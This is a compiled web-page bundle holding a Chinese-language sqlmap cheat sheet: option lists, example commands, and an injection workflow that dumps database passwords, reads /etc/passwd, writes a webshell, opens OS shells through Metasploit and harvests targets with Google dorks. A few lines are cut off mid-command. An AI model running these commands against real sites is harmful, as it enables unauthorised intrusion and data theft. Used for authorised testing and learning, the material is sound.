import{_ as i}from"./plugin-vue_export-helper-x3n3nnut.js";import{r as d,o as a,c as l,a as e,d as t,e as n}from"./app-AksWhL7D.js";const r="/DailyNotes/assets/SQLmap-mHw05ZgF.png",c={},o=n('<h1 id="sqlmap使用手册小结" tabindex="-1"><a class="header-anchor" href="#sqlmap使用手册小结" aria-hidden="true">#</a> SQLmap使用手册小结</h1><figure><img src="'+r+`" alt="SQLmap" tabindex="0" loading="lazy"><figcaption>SQLmap</figcaption></figure><h2 id="_1-基本操作笔记" tabindex="-1"><a class="header-anchor" href="#_1-基本操作笔记" aria-hidden="true">#</a> 1. 基本操作笔记</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>
-u  #注入点 
-f  #指纹判别数据库类型 
-b  #获取数据库版本信息 
-p  #指定可测试的参数(?page=1&amp;id=2 -p &quot;page,id&quot;) 
-D &quot;&quot;  #指定数据库名 
-T &quot;&quot;  #指定表名 
-C &quot;&quot;  #指定字段 
-s &quot;&quot;  #保存注入过程到一个文件,还可中断，下次恢复在注入(保存：-s &quot;xx.log&quot;　　恢复:-s &quot;xx.log&quot; --resume) 
--level=(1-5) #要执行的测试水平等级，默认为1 
--risk=(0-3)  #测试执行的风险等级，默认为1 
--time-sec=(2,5) #延迟响应，默认为5 
--data #通过POST发送数据 
--columns        #列出字段 
--current-user   #获取当前用户名称 
--current-db     #获取当前数据库名称 
--users          #列数据库所有用户 
--passwords      #数据库用户所有密码 
--privileges     #查看用户权限(--privileges -U root) 
-U               #指定数据库用户 
--dbs            #列出所有数据库 
--tables -D &quot;&quot;   #列出指定数据库中的表 
--columns -T &quot;user&quot; -D &quot;mysql&quot;      #列出mysql数据库中的user表的所有字段 
--dump-all            #列出所有数据库所有表 
--exclude-sysdbs      #只列出用户自己新建的数据库和表 
--dump -T &quot;&quot; -D &quot;&quot; -C &quot;&quot;   #列出指定数据库的表的字段的数据(--dump -T users -D master -C surname) 
--dump -T &quot;&quot; -D &quot;&quot; --start 2 --top 4  # 列出指定数据库的表的2-4字段的数据 
--dbms    #指定数据库(MySQL,Oracle,PostgreSQL,Microsoft SQL Server,Microsoft Access,SQLite,Firebird,Sybase,SAP MaxDB) 
--os      #指定系统(Linux,Windows) 
-v  #详细的等级(0-6) 
    0：只显示Python的回溯，错误和关键消息。 
    1：显示信息和警告消息。 
    2：显示调试消息。 
    3：有效载荷注入。 
    4：显示HTTP请求。 
    5：显示HTTP响应头。 
    6：显示HTTP响应页面的内容 
--privileges  #查看权限 
--is-dba      #是否是数据库管理员 
--roles       #枚举数据库用户角色 
--udf-inject  #导入用户自定义函数（获取系统权限） 
--union-check  #是否支持union 注入 
--union-cols #union 查询表记录 
--union-test #union 语句测试 
--union-use  #采用union 注入 
--union-tech orderby #union配合order by 
--data &quot;&quot; #POST方式提交数据(--data &quot;page=1&amp;id=2&quot;) 
--cookie &quot;用;号分开&quot;      #cookie注入(--cookies=”PHPSESSID=mvijocbglq6pi463rlgk1e4v52; security=low”) 
--referer &quot;&quot;     #使用referer欺骗(--referer &quot;http://www.baidu.com&quot;) 
--user-agent &quot;&quot;  #自定义user-agent 
--proxy &quot;http://127.0.0.1:8118&quot; #代理注入 
--string=&quot;&quot;    #指定关键词,字符串匹配. 
--threads 　　  #采用多线程(--threads 3) 
--sql-shell    #执行指定sql命令 
--sql-query    #执行指定的sql语句(--sql-query &quot;SELECT password FROM mysql.user WHERE user = &#39;root&#39; LIMIT 0, 1&quot; ) 
--file-read    #读取指定文件 
--file-write   #写入本地文件(--file-write /test/test.txt --file-dest /var/www/html/1.txt;将本地的test.txt文件写入到目标的1.txt) 
--file-dest    #要写入的文件绝对路径 
--os-cmd=id    #执行系统命令 
--os-shell     #系统交互shell 
--os-pwn       #反弹shell(--os-pwn --msf-path=/opt/framework/msf3/) 
--msf-path=    #matesploit绝对路径(--msf-path=/opt/framework/msf3/) 
--os-smbrelay  # 
--os-bof       # 
--reg-read     #读取win系统注册表 
--priv-esc     # 
--time-sec=    #延迟设置 默认--time-sec=5 为5秒 
-p &quot;user-agent&quot; --user-agent &quot;sqlmap/0.7rc1 (http://sqlmap.sourceforge.net)&quot;  #指定user-agent注入 
--eta          #盲注 
/pentest/database/sqlmap/txt/
common-columns.txt　　字段字典　　　 
common-outputs.txt 
common-tables.txt      表字典 
keywords.txt 
oracle-default-passwords.txt 
user-agents.txt 
wordlist.txt 
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="_2-常用语句" tabindex="-1"><a class="header-anchor" href="#_2-常用语句" aria-hidden="true">#</a> 2. 常用语句</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>1./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -f -b --current-user --current-db --users --passwords --dbs -v 0 
2./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --passwords -U root --union-use -v 2 
3./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --dump -T users -C username -D userdb --start 2 --stop 3 -v 2 
4./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --dump -C &quot;user,pass&quot;  -v 1 --exclude-sysdbs 
5./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --sql-shell -v 2 
6./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --file-read &quot;c:\\boot.ini&quot; -v 2 
7./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --file-write /test/test.txt --file-dest /var/www/html/1.txt -v 2 
8./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --os-cmd &quot;id&quot; -v 1 
9./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --os-shell --union-use -v 2 
10./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --os-pwn --msf-path=/opt/framework/msf3 --priv-esc -v 1 
11./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --os-pwn --msf-path=/opt/framework/msf3 -v 1 
12./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --os-bof --msf-path=/opt/framework/msf3 -v 1 
13./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 --reg-add --reg-key=&quot;HKEY_LOCAL_NACHINE\\SOFEWARE\\sqlmap&quot; --reg-value=Test --reg-type=REG_SZ --reg-data=1 
14./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --eta 
15./sqlmap.py -u &quot;http://192.168.136.131/sqlmap/mysql/get_str_brackets.php?id=1&quot; -p id --prefix &quot;&#39;)&quot; --suffix &quot;AND (&#39;abc&#39;=&#39;abc&quot;
16./sqlmap.py -u &quot;http://192.168.136.131/sqlmap/mysql/basic/get_int.php?id=1&quot; --auth-type Basic --auth-cred &quot;testuser:testpass&quot;
17./sqlmap.py -l burp.log --scope=&quot;(www)?\\.target\\.(com|net|org)&quot;
18./sqlmap.py -u &quot;http://192.168.136.131/sqlmap/mysql/get_int.php?id=1&quot; --tamper tamper/between.py,tamper/randomcase.py,tamper/space2comment.py -v 3 
19./sqlmap.py -u &quot;http://192.168.136.131/sqlmap/mssql/get_int.php?id=1&quot; --sql-query &quot;SELECT &#39;foo&#39;&quot; -v 1 
20./sqlmap.py -u &quot;http://192.168.136.129/mysql/get_int_4.php?id=1&quot; --common-tables -D testdb --banner 
21./sqlmap.py -u &quot;http://192.168.136.129/mysql/get_int_4.php?id=1&quot; --cookie=&quot;PHPSESSID=mvijocbglq6pi463rlgk1e4v52; security=low&quot; --string=&#39;xx&#39; --dbs --level=3 -p &quot;uid&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="_3-简单的注入流程" tabindex="-1"><a class="header-anchor" href="#_3-简单的注入流程" aria-hidden="true">#</a> 3. 简单的注入流程</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>1.读取数据库版本，当前用户，当前数据库 
sqlmap -u http://www.xxxxx.com/test.php?p=2 -f -b --current-user --current-db -v 1 
2.判断当前数据库用户权限 
sqlmap -u http://www.xxxxx.com/test.php?p=2 --privileges -U 用户名 -v 1 
sqlmap -u http://www.xxxxx.com/test.php?p=2 --is-dba -U 用户名 -v 1 
3.读取所有数据库用户或指定数据库用户的密码 
sqlmap -u http://www.xxxxx.com/test.php?p=2 --users --passwords -v 2 
sqlmap -u http://www.xxxxx.com/test.php?p=2 --passwords -U root -v 2 
4.获取所有数据库 
sqlmap -u http://www.xxxxx.com/test.php?p=2 --dbs -v 2 
5.获取指定数据库中的所有表 
sqlmap -u http://www.xxxxx.com/test.php?p=2 --tables -D mysql -v 2 
6.获取指定数据库名中指定表的字段 
sqlmap -u http://www.xxxxx.com/test.php?p=2 --columns -D mysql -T users -v 2 
7.获取指定数据库名中指定表中指定字段的数据 
sqlmap -u http://www.xxxxx.com/test.php?p=2 --dump -D mysql -T users -C &quot;username,password&quot; -s &quot;sqlnmapdb.log&quot; -v 2 
8.file-read读取web文件 
sqlmap -u http://www.xxxxx.com/test.php?p=2 --file-read &quot;/etc/passwd&quot; -v 2 
9.file-write写入文件到web 
sqlmap -u http://www.xxxxx.com/test.php?p=2 --file-write /localhost/mm.php --file使用sqlmap绕过防火墙进行注入测试：
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h4 id="_3-1-注入判断" tabindex="-1"><a class="header-anchor" href="#_3-1-注入判断" aria-hidden="true">#</a> 3.1 注入判断</h4><p>当给<code>sqlmap</code>这么一个<code>url</code>的时候，它会：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>1. 判断可注入的参数
2. 判断可以用那种SQL注入技术来注入
3. 识别出哪种数据库
4. 根据用户选择，读取哪些数据
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><code>sqlmap</code>支持五种不同的注入模式：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>1. 基于布尔的盲注，即可以根据返回页面判断条件（真\\|假）的注入。

2. 基于时间的盲注，即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断。

3. 基于报错注入，即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。

4. 联合查询注入，可以使用union的情况下的注入。

5. 堆查询注入，可以同时执行多条语句的执行时的注入。（使用;分隔开多条语句，最为灵活，可以自己构造select（含）外的其他语句）
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>可以提供一个简单的<code>URL，Burp</code>或<code>WebScarab</code>请求日志文件，文本文档中的完整<code>http</code>请求或者<code>Google</code>的搜索，匹配出结果页面，也可以自己定义一个正则来判断那个地址去测试。测试<code>GET</code>参数，<code>POST</code>参数，<code>HTTP Cookie</code>参数，<code>HTTP User-Agent</code>头和<code>HTTP Referer</code>头来确认是否有<code>SQL</code>注入，它也可以指定用逗号分隔的列表的具体参数来测试。可以设定<code>HTTP(S)</code>请求的并发数，来提高盲注时的效率。</p><p><strong>GET方式</strong></p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>sqlmap -u &quot;url&quot; //这个URL必须含？
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p><strong>POST方式</strong></p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>sqlmap -u http://testasp.vulnweb.com/Login.asp --data &quot;tfUName=1&amp;tfUPass=1&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p><strong>cookie注入</strong></p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>sqlmap -u &quot;url&quot; --cookie &quot;chsadj&quot; --level 2 //这里的URL去掉？及其后的内容，并将它们放在cookie的内容里面
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p><strong>tamper方式</strong></p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>sqlmap -u &quot;url&quot; -v 3 --batch --tamper &quot;sac.py&quot;  //temper后面的插件可以去sql安装目录查找
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p><strong>自动检测表</strong></p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>sqlmap -u http://testasp.vulnweb.com/Login.asp --forms
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p><strong>延时两秒</strong></p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>Sqlmap –u “url” --delay 2
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p><strong>频率3次</strong></p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>Sqlmap –u “url” --safe-freq 3
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p><strong>伪静态</strong></p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>Sqlmap -u http://sfl.fzu.edu.cn/index.php/Index/view/id/40.html //在40后面加*
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h4 id="_3-2-查看数据库" tabindex="-1"><a class="header-anchor" href="#_3-2-查看数据库" aria-hidden="true">#</a> 3.2 查看数据库</h4><p><code>sqlmap</code>支持的数据库管理系统有：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>MySQL, Oracle, PostgreSQL, Microsoft SQL Server, Microsoft Access, IBM DB2,
SQLite, Firebird, Sybase和SAP MaxDB
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p><strong>命令</strong></p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>sqlmap -u &quot;url&quot; --dbs   //查看所有数据库
sqlmap -u &quot;url&quot; --users //查看所有用户
sqlmap -u &quot;url&quot; --current-db //查看当前的数据库
sqlmap -u &quot;url&quot; --current-user //产看当前的用户
sqlmap -u &quot;url&quot; --is-dba //查看是否是最高权限
sqlmap -u &quot;url&quot; --passwords //查看所有密码
sqlmap -u &quot;url&quot; –hostname //查看主机名
sqlmap -u &quot;url&quot; privileges -U username //查看用户权限
sqlmap -u &quot;url&quot; –roles //查看用户角色
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><strong>查看详细内容</strong></p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>sqlmap -u &quot;url&quot; --tables -D &quot;database&quot; //database这个数据库的表数据表
sqlmap -u &quot;url&quot; --columns -T &quot;tables&quot; -D &quot;database&quot; //查看tables这个数据表的字段
sqlmap -u &quot;url&quot; --dump &quot;a,b,c&quot; -C &quot;columns&quot; -T &quot;tables&quot; -D &quot;database&quot; //下载内容，后面的-CTDabc都是对下载的数据库表段的约束如果不加就是下载所有
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h4 id="_3-3-执行特殊操作" tabindex="-1"><a class="header-anchor" href="#_3-3-执行特殊操作" aria-hidden="true">#</a> 3.3 执行特殊操作</h4><p><strong>文件查看</strong></p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>sqlmap -u &quot;url&quot; –file-read= //这个读取的文件会存在本地的结果目录，请认真看提示
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p><strong>文件写入</strong></p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>sqlmap -u &quot;url&quot; --file-write=本地文件路径 --file-dest=网站的绝对路径 //上传webshell用，需要dba权限
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p><strong>命令执行</strong></p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>sqlmap -u &quot;url&quot; --os-cmd &quot;cmd&quot;  //执行cmd代表的命令，如cd C:/

sqlmap -u &quot;url&quot; --os-shell  //进入数据库自带的shell
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="_4-命令总览" tabindex="-1"><a class="header-anchor" href="#_4-命令总览" aria-hidden="true">#</a> 4. 命令总览</h2><p>使用<code>sqlmap -hh</code>可以查看详细的命令说明：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>-r 1.txt            对于用post方法提交的，参数不在URL里面的网页，可以先截获数据，保存成文件再用这个参数执行
-l log.txt          可以将代理的日志作为目标去检测
-m 1.txt            对于多个URL，可以一排一个写入文件后加载
--force-ssl         对于使用SSL的URL要在后面加上这个参数
--data              对于使用post方法，可以将参数写在data后面
--param-del=&quot;&quot;          
--cookie=&quot;&quot;  level 2        对于需要验证才能访问的URL，可以加上cookie值验证，如果要检测cookie是否有注入漏洞，level要高于1
--random-agent          使用随机的user-agent
--user-agent=&quot;&quot;  level 3    指定user-agent，如要检测它是否有漏洞level要高于2
--header=&quot;\\n&quot;           指定头信息，如User-Agent:dsacs，大小写敏感，多个用\\n分隔
--method=GET POST       设置提交方式，默认一个一个的尝试
--auth-type             如果是基于http的验证，如Basic NTLM Digest，可直接加类型再配合下一个参数使用
--auth-cred &quot;user:pass&quot;     填写账号和密码
 --proxy=&quot;http:127.0.0.1:8087&quot;  使用代理
--proxy-cred=&quot;name:pass&quot;    如果代理要密码的话
--ignore-proxy          强制不使用代理
--delay             请求延迟间隔，单位秒，默认无延迟
--retries           链接失败重试次数3
--timeout           链接超时时间30
--randomize=&quot;param&quot;     使用和源参数类型长度一致的参数
sqlmap -l l.log --scope=&quot;(www)?\\.target\\.(com|net|org)&quot;     这是一个正则表达式，是对于log文件里面URL过多时，进行筛选，这里是只要com/net/org结尾的域名
sqlmap -l 2.log --scope=&quot;(19)?\\.168\\.20\\.(1|11|111)&quot;        同上，筛选19*.168.20.1/11/111这几个网段的IP
--safe-url=&quot;url&quot;        设置正确的URL，因为如果一直尝试错误的URL可能会被服务器拉黑，过几次登下正确的防止这个发生
--safe-freq 10          尝试的与正确的URL的交换频率
--skip-urlencode        有的URL在get方式提交时没编码，就要用这个
--eval=&quot;&quot;php代码      这个后面可以跟PHP代码，能够执行
--keep-alive            保持连接会降低资源使用，但是不能与代理兼容
--predict-output        能够在找到一个信息后缩小检测的范围，不能与--threads兼容
--null-connection       只看返回文件的大小，不要他的内容与--text-only不兼容
--threads           最大并发数，默认1，最大不要超过10，盲注时一次返回一个字符【7次请求】
-o              使用除了--threads的全部的优化参数
-p              指定参数，使level失效
-skip               排除不扫描的参数
                对于伪静态网页，就在参数后面加*
--dbms              接数据库管理系统，如MySQL
--os                接系统，如Linux
--invalid-bignum        使用大数作为假的值
--invalid-logical       使用逻辑数作为假的值
--no-cat            对于接收到的null不自动转换成空格
--no-escape         不使用逃逸，就是不把&#39;转换成asii码形式
--prefix            在参数前指定前缀
--suffix            在参数后指定后缀
--level             设置检查的等级，默认为1，共5个，可以查看/usr/share/sqlmap/xml/payloads这个文件了解详细的信息
--risk              设置风险等级，默认是安全的检查，第四等可能会修改数据库内容
--string            当页面含有这个字符串时为真
--not-string            当页面不含这个字符串时为真
--regexp            用正则表达式判断
--code              当状态代码为*时为真
--text-only         页面含有*时为真
--titles            页面标题为*时为真
--techniques 
B E U S T           使用什么检查技术，默认所有，这里分别是基于布尔的盲注，基于错误的判断，联合查询，堆积，基于时间的查询
--time-sec          
--union-cols            联合查询第几列到第几列
--union-char            用select null,1:2  这种，可能会出错，就讲这个null换成其他数字占位
--second-order          当注入后在第二个页面显示错误信息，这里就接上显示错误信息的地方
-fingerprint            指纹信息
--banner            版本信息
--batch             按照软件默认设置，自动回答
--count             计数
-s              将这个会话保存下次继续
-t              将这些数据保存
--charset           强制设置数据库编码
--crawl             设置蜘蛛爬行的深度
--csv-del           设置下载的数据的分隔方式，默认是,
--dbms-cred         设置数据库用户
--flush-session         清空以前的会话数据
--fresh-queries         不清空会话，重新查询
--hex               一16进制编码的方式传输数据
--output-dir            会话输出文件夹
--parse-errors          显示MySQL错误信息
--save              保存当前配置为文件
-z              特别的助记方式，后面接的只要是独一无二的企鹅存在的就可以用，如user-agent可以用ueraet.
--answers           这个可以对一些特定的问题作出回答，在自动化注入中用
--check-waf         检查是否含有waf等
--identify-waf          彻底的检查waf等的信息
--smart     当有大量目标时，这个就只检查基于错误的注入点
--mobile    模拟智能手机去扫描
--wizard    向导模式
--purge-out 清除输出内容
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h4 id="用来连接数据库" tabindex="-1"><a class="header-anchor" href="#用来连接数据库" aria-hidden="true">#</a> 用来连接数据库</h4><p>这是一个比较实用的功能，用来连接数据库格式为</p><h4 id="设置显示信息的详细度" tabindex="-1"><a class="header-anchor" href="#设置显示信息的详细度" aria-hidden="true">#</a> 设置显示信息的详细度：</h4><p>使用<code>-v</code>参数，共有<code>七</code>个等级：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>0. 只显示python错误以及严重的信息。
1. 同时显示基本信息和警告信息。（默认）
2. 同时显示debug信息。
3. 同时显示注入的payload。
4. 同时显示HTTP请求。
5. 同时显示HTTP响应头。
6. 同时显示HTTP响应页面。
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>可以通过学习<code>sqlmap</code>的<code>payload</code>来学习<code>sql</code>注入，这时需要使用3级。</p><h4 id="获取目标方式" tabindex="-1"><a class="header-anchor" href="#获取目标方式" aria-hidden="true">#</a> 获取目标方式</h4><p><strong>目标URL</strong></p><p>参数：<code>-u</code>或者<code>–url</code></p><p>格式：<code>http(s)://targeturl[:port]/[…]</code></p><p>例如：<code>python sqlmap.py -u &quot;http://www.target.com/vuln.php?id=1&quot; -f --banner --dbs --users</code></p><p>从<code>Burp</code>或者<code>WebScarab</code>代理中获取日志</p><p>参数：<code>-l</code></p><p>可以直接吧<code>Burp proxy</code>或者<code>WebScarab proxy</code>中的日志直接倒出来交给<code>sqlmap</code>来一个一个检测是否有注入。</p><p><strong>从文本中获取多个目标扫描</strong></p><p>参数：<code>-m</code></p><p>文件中保存<code>url</code>格式如下，<code>sqlmap</code>会一个一个检测</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>www.target1.com/vuln1.php?q=foobar

www.target2.com/vuln2.asp?id=1

www.target3.com/vuln3/id/1*
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><strong>从文件中加载HTTP请求</strong></p><p>参数：<code>-r</code></p><p><code>sqlmap</code>可以从一个文本文件中获取<code>HTTP</code>请求，这样就可以跳过设置一些其他参数（比如<code>cookie，POST</code>数据，等等）。</p><p>比如文本文件内如下：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>POST /vuln.php HTTP/1.1

Host: www.target.com

User-Agent: Mozilla/4.0

id=1
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>当请求是HTTPS的时候你需要配合这个<code>–force-ssl</code>参数来使用，或者你可以在Host头后面加上:<code>443</code></p><p><strong>处理Google的搜索结果</strong></p><p>参数：<code>-g</code></p><p><code>sqlmap</code>可以测试注入<code>Google</code>的搜索结果中的<code>GET</code>参数（只获取前<code>100</code>个结果）。</p><p>例子：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>python sqlmap.py -g &quot;inurl:\\&quot;.php?id=1\\&quot;&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>此外可以使用-c参数加载sqlmap.conf文件里面的相关配置。</p><h4 id="请求" tabindex="-1"><a class="header-anchor" href="#请求" aria-hidden="true">#</a> 请求</h4><p><strong>http数据</strong></p><p>参数：<code>–data</code></p><p>此参数是把数据以<code>POST</code>方式提交，<code>sqlmap</code>会像检测GET参数一样检测<code>POST</code>的参数。</p><p>例子：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>python sqlmap.py -u &quot;http://www.target.com/vuln.php&quot; --data=&quot;id=1&quot; -f --banner --dbs --users
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p><strong>参数拆分字符</strong></p><p>参数：<code>–param-del</code></p><p>当<code>GET</code>或<code>POST</code>的数据需要用其他字符分割测试参数的时候需要用到此参数（默认是&amp;）。</p><p>例子：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>python sqlmap.py -u &quot;http://www.target.com/vuln.php&quot; --data=&quot;query=foobar;id=1&quot;
--param-del=&quot;;&quot; -f --banner --dbs --users
